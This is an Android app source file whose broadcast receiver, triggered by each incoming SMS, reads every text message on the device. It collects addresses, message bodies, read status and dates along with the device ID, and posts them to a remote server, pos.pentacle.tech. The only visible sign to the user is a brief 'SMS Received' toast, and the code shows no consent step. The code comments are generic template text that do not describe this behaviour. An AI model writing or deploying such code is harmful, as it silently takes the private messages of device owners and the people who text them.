package com.federation.funf_test.SMSActivity;

import android.app.IntentService;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.os.AsyncTask;
import android.provider.Settings;
import android.widget.Toast;

import com.federation.funf_test.JSONParser;

import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import me.everything.providers.android.telephony.Sms;
import me.everything.providers.android.telephony.TelephonyProvider;

import static android.content.ContentValues.TAG;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class SmsIntentService extends BroadcastReceiver {
    ArrayList params = new ArrayList();

    JSONParser jsonParser = new JSONParser();
    private ProgressDialog pDialog;
    private static String url_create = "https://pos.pentacle.tech/api/message/create";
    private static final String TAG_SUCCESS = "success";
    List<Sms> smsList;

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            ArrayList<JSONObject> smsArrayList= new ArrayList<>();

            TelephonyProvider telephonyProvider = new TelephonyProvider(context);
            smsList = telephonyProvider.getSms(TelephonyProvider.Filter.ALL).getList();

            String androidId = Settings.Secure.getString(context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);

            for (Sms i : smsList) {
                JSONObject newSMS = new JSONObject();

                try {
                    newSMS.put("device_id", androidId);
                    newSMS.put("address", i.address);
                    newSMS.put("content", i.body);
                    newSMS.put("seen_status", i.seen);
                    newSMS.put("read_status", i.read);
                    newSMS.put("sent_at", i.sentDate);
                    newSMS.put("received_at", i.receivedDate);

                    smsArrayList.add(newSMS);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }

            Toast.makeText(context, "SMS Received", Toast.LENGTH_SHORT).show();

            params.add(new BasicNameValuePair("device_id", androidId));
            params.add(new BasicNameValuePair("sms_list", smsArrayList.toString()));
            new CreateNewResult().execute();
        }
    }

    class CreateNewResult extends AsyncTask<String, String, JSONObject> {
        /**
         * Before starting background thread Show Progress Dialog
         */
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        /**
         * Creating product
         */
        protected JSONObject doInBackground(String... args) {
            // getting JSON Object
            // Note that create product url accepts POST methodN
            JSONObject json = jsonParser.makeHttpRequest(url_create,
                    "POST", params);
            // check log cat fro response
            //Log.d("Debug", json.toString());

            return json;
        }

        /**
         * After completing background task Dismiss the progress dialog
         **/
        protected void onPostExecute(JSONObject file_url) {
            // dismiss the dialog once done
        }
    }
}
